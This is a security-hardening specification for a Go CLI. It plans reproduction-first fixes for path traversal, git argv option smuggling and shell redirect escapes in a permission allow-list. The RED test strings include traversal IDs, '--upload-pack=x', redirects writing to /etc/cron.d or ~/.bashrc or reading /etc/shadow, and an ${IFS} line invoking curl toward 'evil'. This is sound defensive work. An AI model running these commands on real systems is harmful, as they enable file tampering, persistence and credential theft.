---
id: SPEC-SEC-HARDEN-002
title: "CLI SPEC-ID/path sanitizer + permission redirect-operator hardening (SEC-HARDEN-001 fast-follow)"
version: "0.1.0"
status: in-progress
created: 2026-06-13
updated: 2026-06-13
author: manager-spec
priority: P1
phase: "v3.0.0"
module: "internal/cli, internal/cli/worktree, internal/core/git, internal/permission"
lifecycle: spec-anchored
tags: "security, path-traversal, argv-injection, permission, redirect-operator, behavior-preservation, cwe-22, cwe-88, reproduction-first"
era: V3R6
tier: M
---

# SPEC-SEC-HARDEN-002 — CLI SPEC-ID/path sanitizer + permission redirect-operator hardening

## HISTORY

| Version | Date | Author | Change |
|---------|------|--------|--------|
| 0.1.0 | 2026-06-13 | manager-spec | Initial draft. Fast-follow of the completed SPEC-SEC-HARDEN-001. Two confirmed in-scope clusters carried over from -001 §F.3 (uncovered `cli` package group) and -001 progress.md "Known limitations" (D2 deferred MEDIUM). All findings pre-verified by 4 parallel read-only audits at HEAD `639fd7a5e` (4 file anchors spot-verified during plan-phase: stack.go:127-201, update_archive.go:99-122, worktree/new.go:108/141, worktree.go:46/52). Two milestone clusters: M1-M3 the unified CLI SPEC-ID/path sanitizer (closes the only HIGH + its root-cause cluster), M4 the permission redirect-operator scanner extension (the -001 D2 deferred MEDIUM). Reproduction-first: every fix specified as a RED case that the CURRENT code resolves to allow/traversal. |

---

## §A. Context & Motivation

SPEC-SEC-HARDEN-001 (status: **completed** — terminal) closed 5 HIGH-severity defects across `internal/permission`, `internal/tmux`, `internal/lsp`, `internal/resilience`, and `internal/cli/worktree`. Its sweep stopped short of two areas, recorded as explicit deferred follow-ups:

1. **§F.3 — uncovered package groups** (`cli/cmd` + others): the full-codebase sweep stalled before reviewing the CLI subcommand surface for SPEC-ID / path handling. A targeted re-sweep of the `internal/cli` SPEC-ID boundaries surfaced one HIGH (`worktree new` path traversal) plus a root-cause cluster of sibling read-path traversals and an argv option-smuggling gap that share the same fix.
2. **progress.md "Known limitations" D2** (deferred MEDIUM): the M1 permission `:*` separator set does not include the shell redirect operators `>`/`>>`/`<`. An allow-listed read/test command (`go test`) thereby becomes an arbitrary-file-write primitive (`go test > /etc/cron.d/payload` resolves to ALLOW).

This SPEC closes both. The motivation for bundling them into one Tier-M SPEC is that all four findings (M1-M4) share the **same disciplined methodology** SEC-HARDEN-001 established: a reproduction test that demonstrates the defect FIRST (RED — the current code resolves to allow/traversal), then the minimal behavior-preserving fix, then no-regression verification that legitimate inputs are unchanged. M4 in particular is an additive extension of the exact quote-aware scanner the SEC-HARDEN-001 D1 fix (`f25772d1c`) hardened — it only adds a deny condition on the same branch, the lowest-regression-risk shape possible.

### Verified evidence index (confirmed by 4 parallel audits; 4 anchors spot-verified at HEAD `639fd7a5e`)

| Milestone | Finding | Package | File:Line (verified) | Severity | Class |
|-----------|---------|---------|----------------------|----------|-------|
| M1 | (helper) | internal/cli | new helper modeled on `update_archive.go:99-122` `validateSkillID` | — | enabler — unified `validateSpecID` |
| M2a | A-F1 | internal/cli/worktree | `new.go:108` (`specID := args[0]`) → `new.go:141` (`filepath.Join(homeDir, ".moai", "worktrees", projectName, specID)` + `os.MkdirAll`/`Add`) | HIGH | SECURITY — path traversal (CWE-22) |
| M2b | A-F3 | internal/core/git | `worktree.go:46` + `worktree.go:52` (git `worktree add` argv accepts `-`-leading operands) | MEDIUM | SECURITY — argv option smuggling (CWE-88) |
| M3 | A-F4 | internal/cli | `spec_view.go:30` (`args[0]`)→`:49` join; `spec_status.go:52` (`args[0]`)→`:77` join; `spec_close.go:98` (`args[0]`) → guard at CLI boundary, deeper transitive join sink at `internal/spec/closer.go:173` | LOW | SECURITY — read-path traversal (CWE-22, constrained to spec.md-named files) |
| M4 | D2 (SEC-HARDEN-001) | internal/permission | `stack.go:189-195` (separator `case` in `hasUnquotedShellSeparator`); reached via `stack.go:127-137` `:*` branch + `resolver.go` `Resolve` | MEDIUM | SECURITY — redirect operator escalation (allow→write primitive) |

---

## §B. GEARS Requirements

### M1 — Unified `validateSpecID` sanitizer helper (enabler)

- **REQ-SEC2-M1-001** (Ubiquitous): The CLI shall provide ONE shared SPEC-ID validation helper, modeled on the existing `validateSkillID` (`internal/cli/update_archive.go:99-122`), that rejects a SPEC-ID containing `..`, a path separator (`/` or `\`), or an absolute path.
- **REQ-SEC2-M1-002** (Event-driven): When the helper receives a SPEC-ID that is a legitimate canonical identifier (matches the canonical SPEC-ID shape, e.g. `SPEC-SEC-HARDEN-002`, with no traversal metacharacters), the helper shall accept it (return no error).
- **REQ-SEC2-M1-003** (Event-driven): When the helper receives a SPEC-ID containing `..`, a path separator, or an absolute-path prefix, the helper shall return a structured validation error and shall not let the value reach any `filepath.Join` path-construction site.
- **REQ-SEC2-M1-004** (Ubiquitous): The helper shall be the single source of SPEC-ID sanitization for all CLI SPEC-ID boundaries enumerated in M2 and M3 (no per-call-site bespoke validation).

### M2 — Apply sanitizer at the `worktree new` boundary + `--` argv separator

- **REQ-SEC2-M2-001** (Event-driven): When `moai worktree new <SPEC-ID>` receives a positional SPEC-ID containing a path-traversal sequence (`..`, path separator, or absolute path), the command shall reject the input via the M1 helper BEFORE constructing the worktree path or calling `os.MkdirAll` / `WorktreeProvider.Add`, so no directory is created outside `~/.moai/worktrees/<project>/`.
- **REQ-SEC2-M2-002** (Ubiquitous): The `worktree new` command shall continue to accept a legitimate SPEC-ID and construct the worktree path at `~/.moai/worktrees/<project>/<SPEC-ID>` unchanged.
- **REQ-SEC2-M2-003** (Event-driven): When the git worktree-add argv is assembled from user-derived operands (worktree path, branch name), the git wrapper shall insert a `--` end-of-options separator before the first user-derived operand so an operand beginning with `-` (e.g. `--upload-pack=x`) is treated as a positional argument, not a git option.
- **REQ-SEC2-M2-004** (Capability gate): Where the `--path` flag is supplied (a documented user-custom escape hatch), the command shall, at minimum, reject a `--path` value that still contains `..` after `filepath.Clean`; the command shall NOT otherwise over-constrain the documented `--path` escape hatch (full `--path` policy is a maintainer note, deferred — see §F.2).

### M3 — Apply sanitizer at the spec subcommand read boundaries

- **REQ-SEC2-M3-001** (Event-driven): When `moai spec view <SPEC-ID>` receives a SPEC-ID containing a path-traversal sequence, the command shall reject the input via the M1 helper at the CLI `args[0]` boundary BEFORE constructing the `.moai/specs/<SPEC-ID>` read path, so no file outside `.moai/specs/` is read.
- **REQ-SEC2-M3-002** (Ubiquitous): The same M1-helper guard shall be applied at the CLI `args[0]` boundary of exactly THREE spec subcommands that accept a positional SPEC-ID — `spec view` (`spec_view.go:30`), `spec status` (`spec_status.go:52`), and `spec close` (`spec_close.go:98`). For `spec close`, the guard is applied at the CLI handler (`spec_close.go:98`, immediately after `specID := args[0]`, before calling `spec.Close(specID, opts)`); the path-join sink itself lives deeper at `internal/spec/closer.go:173`, so guarding at the CLI boundary stops the traversal before it reaches the transitive sink. `spec drift` is EXCLUDED — it has no positional SPEC-ID (RunE/PostRunE only, repo-wide drift command, no `args[0]`).
- **REQ-SEC2-M3-003** (Ubiquitous): Each of the three guarded spec subcommands shall continue to resolve a legitimate SPEC-ID to its `.moai/specs/<SPEC-ID>/spec.md` path (or `spec.Close` operation for `spec close`) and behave unchanged for valid inputs.

### M4 — Permission resolver redirect-operator hardening (SEC-HARDEN-001 D2)

- **REQ-SEC2-M4-001** (Event-driven): When the permission resolver scans the remainder past a matched `:*` prefix rule and that remainder contains an unquoted shell redirect operator (`>`, `>>`, `<`, including the digit-prefixed `2>` form whose `>` is unquoted), the resolver shall report no match for that rule (so the redirect-bearing command is not silently allowed by the prefix rule).
- **REQ-SEC2-M4-002** (Ubiquitous): The redirect-operator detection shall be implemented as an additive extension of the EXISTING quote-aware scanner `hasUnquotedShellSeparator` (`internal/permission/stack.go`) — adding `>` and `<` to the existing unquoted-separator `case` — preserving the same quote-aware semantics introduced by the SEC-HARDEN-001 D1 fix.
- **REQ-SEC2-M4-003** (State-driven): While a `>` or `<` character appears only inside a quoted argument segment of the input, the resolver shall not treat that quoted redirect character as a command boundary (no false rejection of a single command containing a quoted `>`/`<`).
- **REQ-SEC2-M4-004** (Ubiquitous): The resolver shall preserve its existing behavior for the operators already denied today — `&>`, `>&`, and `2>&1` remain conservatively denied via the existing `&` branch (errs safe; this SPEC shall NOT special-case them back to allow).

---

## §C. Behavior-Preservation Mandate (cross-cutting, all milestones)

[HARD] Every milestone touches either CLI path construction at a security boundary or the permission allow/deny scanner. Each fix MUST be behavior-preserving for the non-defect paths.

- **RED first**: Each milestone MUST land a reproduction test FIRST that demonstrates the defect against the CURRENT code (the test MUST FAIL on the pre-fix code — asserting the current code resolves the malicious input to allow / traversal / created-dir-outside-root). cycle_type = tdd.
- **Minimal fix**: The implementation change MUST be the minimal change that makes the reproduction test pass and applies the M1 helper at the boundary. No drive-by refactors, no adjacent cleanup, no `--path` over-constraint beyond the `..`-after-Clean rejection in REQ-SEC2-M2-004.
- **No regression**: After each fix, the existing behavior for all legitimate (non-malicious) inputs MUST remain identical. Each milestone's AC includes explicit no-regression assertions, and the full existing package test suites (`internal/permission`, `internal/cli`, `internal/cli/worktree`, `internal/core/git`) MUST stay green.
- **M4 quote-awareness**: The M4 extension MUST stay quote-aware — the existing `TestMatches_*` and the D1 8-case suite (`internal/permission/stack_sec_harden_test.go`) MUST stay green, and the new redirect cases MUST be RED-first.

---

## §D. Acceptance Criteria Summary

Full Given-When-Then scenarios with grep-verifiable + RED/NO-REG command assertions live in `acceptance.md`. Each milestone has its own AC group (AC-SEC2-M1-*, AC-SEC2-M2-*, AC-SEC2-M3-*, AC-SEC2-M4-*) covering: (a) the reproduction test that FAILS pre-fix (the current ALLOW/traversal behavior), (b) the fix making it DENY/reject, (c) explicit no-regression assertions for the legitimate paths. The canonical RED command strings are:

- `moai worktree new '../../../../tmp/evil'` (M2 — currently creates a worktree dir OUTSIDE `~/.moai/worktrees/<project>/`)
- `moai worktree new '--upload-pack=x'` (M2 — argv option smuggling)
- `moai spec view '../../../../etc'` (M3 — read-path traversal)
- `go test > /etc/cron.d/payload`, `go test >> ~/.bashrc`, `go test 2> /tmp/x`, `go test < /etc/shadow` (M4 — currently ALLOW)

NO-REG: legitimate `SPEC-SEC-HARDEN-002`-style IDs still accepted; `go test -run 'TestGreater>'` and `go test "a > b"` (quoted) STAY ALLOW.

---

## §E. Verification Approach

- M1: table-driven `validateSpecID` tests — legitimate ID (accepted), `..` (rejected), path separator (rejected), absolute path (rejected). Mirrors `validateSkillID` test shape.
- M2a: invoke `runNew` with a traversal SPEC-ID via the existing test harness (injectable `userHomeDirFunc` / `getProjectNameFunc`); assert no directory created outside the worktree root and a structured rejection error returned BEFORE `MkdirAll`/`Add`. NO-REG: legitimate SPEC-ID still constructs `~/.moai/worktrees/<project>/<SPEC-ID>`.
- M2b: assert the git worktree-add argv contains a `--` token immediately before the first user-derived operand (`path` / branch); a `-`-leading operand is passed positionally. Verify via the git wrapper's argv assembly (injectable exec or argv-capture).
- M3: invoke the THREE positional-SPEC-ID entry points (`spec view` `viewAcceptanceCriteria`, `spec status`, `spec close` at its `args[0]` handler) with a traversal SPEC-ID; assert rejection at the CLI boundary before the read-path / `spec.Close` join is reached. (`spec drift` excluded — no positional SPEC-ID.) NO-REG: legitimate SPEC-ID resolves to `.moai/specs/<SPEC-ID>/spec.md`.
- M4: table-driven `hasUnquotedShellSeparator` / `Matches` tests — each redirect variant (`>`, `>>`, `<`, `2>`) past a `:*` prefix → no match (deny); quoted `>`/`<` → still matches (NO-REG); the D1 8-case suite + existing separator suite stay green.

---

## §F. Exclusions (What NOT to Build)

[HARD] The following are explicitly OUT of scope for this SPEC. They are deferred to future fast-follow SPEC(s) and MUST NOT be pulled into SPEC-SEC-HARDEN-002. They are listed here as deferred follow-ups only.

### F.1 Out of scope — D3 `${IFS}` word-split (deferred, dependency-blocked)

- `go test ${IFS}curl${IFS}evil` resolves to ALLOW today (verified). This CANNOT be caught by lexical separator scanning — no separator character is present; the word-split happens at shell expansion time.
- A lexical `$`-blacklist extension has HIGH false-positive cost (it would deny legitimate `$HOME`, `${HOME}`, `TestX$` — 4 of 9 legitimate sample inputs). The invariant-conformant robust fix requires the `mvdan.cc/sh` shell-aware parser as a NEW direct dependency (not currently in `go.mod`), deferred pending maintainer dependency-acceptance.
- This SPEC shall NOT ship a `$`-blacklist hack. Documented as a known limitation consistent with SPEC-SEC-HARDEN-001 design.md §F.4 (shell expansion out of scope).

### F.2 Out of scope — full `--path` flag policy + remaining MEDIUM env-trust findings (deferred)

- Full `--path` flag traversal policy beyond the `..`-after-`filepath.Clean` rejection in REQ-SEC2-M2-004 — `--path` is a documented user-custom escape hatch; over-constraining it is deferred to a maintainer note.
- A-F2 [MEDIUM] `MOAI_UPDATE_URL` / `MOAI_RELEASES_DIR` scheme+host allowlist (`internal/cli/deps.go:260`, `update.go:450`) — threat-model-dependent (env trust), deferred.
- B-F1 [MEDIUM] template `UserName` / `ProjectName` YAML escape (`user.yaml.tmpl`, `project.yaml.tmpl` — primary path uses raw `"{{.UserName}}"` while fallback uses `%q`) — deferred to a template-domain SPEC.

### F.3 Out of scope — remaining hook/update MEDIUM + LOW defense-in-depth findings (deferred)

- C-F1 [MEDIUM] `internal/hook/file_changed.go:143` MX sidecar write from unvalidated hook CWD + uncontained scan — deferred.
- C-F2 [MEDIUM] `internal/cli/update.go:2041` restore follows symlinked backup files — deferred.
- 10 LOW findings (`.env.glm` source-as-RCE-primitive, WSL2 PATH passthrough, sidecar fail-open silent index loss, mx TOCTOU lost-update, byte-truncation on multibyte, `readStdin` `/dev/stdin` fail-open, etc.) — defense-in-depth, deferred.
- `internal/update` binary download / integrity verification — a separate package group, out of this CLI-sweep scope.

### F.4 Out of scope — implementation-detail decisions deferred to run-phase

- Exact placement of the M1 helper (new file vs. existing `internal/cli` file; whether `validateSpecID` lives beside `validateSkillID` or in a shared `internal/cli` sanitizer file) — a run-phase decision, provided the helper is ONE shared function per REQ-SEC2-M1-004.
- Exact mechanism for the `--` argv separator injection in the git wrapper (insert in `worktree.go` `Add` vs. at the caller) — provided the `--` precedes the first user-derived operand per REQ-SEC2-M2-003.
- Error code / message wording for the rejection beyond "a structured validation error is returned and the malicious value never reaches `filepath.Join`".

### F.5 Out of scope — broad refactors

- No refactor of the permission resolver architecture, the worktree manager API, the spec-subcommand command structure, or the git wrapper beyond the minimal behavior-preserving changes required by M1-M4. The M4 change is strictly additive to the existing `hasUnquotedShellSeparator` `case` — no scanner rewrite.

### F.6 Out of scope — incorrect premises explicitly NOT in scope (framing corrections)

- **statusline is NOT a shell-execution sink** — it is a lipgloss display-string renderer; the only statusline-related shell is the static `status_line.sh.tmpl`. This SPEC makes NO statusline shell-injection claim.
- **`internal/mx` and `internal/merge` are NOT in scope** — `internal/mx` is a scanner + JSON sidecar (no annotation-write-back-to-source sink); `internal/merge` is the config/template 3-way merge engine (NOT git PR merge). The git PR merge-method enum (`internal/github` + `internal/config/validation.go`) was already swept clean / double-defended by prior work. None of mx/merge is in this SPEC's scope.
